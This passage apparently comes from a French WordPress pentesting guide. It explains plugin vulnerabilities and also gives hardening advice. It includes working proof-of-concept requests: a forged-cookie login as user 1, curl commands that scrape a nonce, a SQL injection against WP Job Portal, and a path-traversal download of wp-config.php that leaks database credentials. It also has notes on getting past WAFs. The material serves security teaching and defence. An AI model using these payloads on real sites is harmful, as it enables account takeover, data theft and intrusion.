wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c‚Äôest exploitable

- Le hook public `init` rend le gestionnaire accessible aux utilisateurs non authentifi√©s (absence de garde `is_user_logged_in()`).
- L'identit√© est d√©riv√©e d'un cookie modifiable par le client (`original_user_id`).
- Un appel direct √† `wp_set_auth_cookie($uid)` connecte le demandeur en tant que cet utilisateur sans aucune v√©rification de capability/nonce.

Exploitation (non authentifi√©e)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Les WAF g√©n√©riques c√¥t√© edge/serveur sont r√©gl√©s pour d√©tecter des sch√©mas larges (SQLi, XSS, LFI). Beaucoup de failles WordPress/plugin √† fort impact sont des bugs logiques/auth sp√©cifiques √† l'application qui ressemblent √† du trafic b√©nin, √† moins que le moteur ne comprenne les routes WordPress et la s√©mantique des plugins.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. V√©rifiez aussi que la mise √† jour automatique est activ√©e dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **n'installez que des plugins et th√®mes WordPress de confiance**.

### Plugins de s√©curit√©

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur **admin** par d√©faut
- Utilisez des **mots de passe forts** et **2FA**
- **V√©rifiez** p√©riodiquement les **autorisations** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'acc√®s qu'en interne ou depuis certaines adresses IP.


### Injection SQL non authentifi√©e via validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probl√®mes introduits par cet extrait :

1. **Entr√©e utilisateur non assainie** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **Concat√©nation de cha√Ænes dans la clause WHERE** ‚Äì pas d'`is_numeric()` / `esc_sql()` / requ√™te pr√©par√©e.
3. **Accessibilit√© sans authentification** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut r√©cup√©rer depuis une page publique int√©grant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce r√©cent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant la pr√©sence d'une SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via path traversal. Le sink vuln√©rable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans assainissement**. Encore une fois, la seule barri√®re est un **CSRF nonce** qui peut √™tre r√©cup√©r√© depuis la page de CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur renvoie le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## R√©f√©rences

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
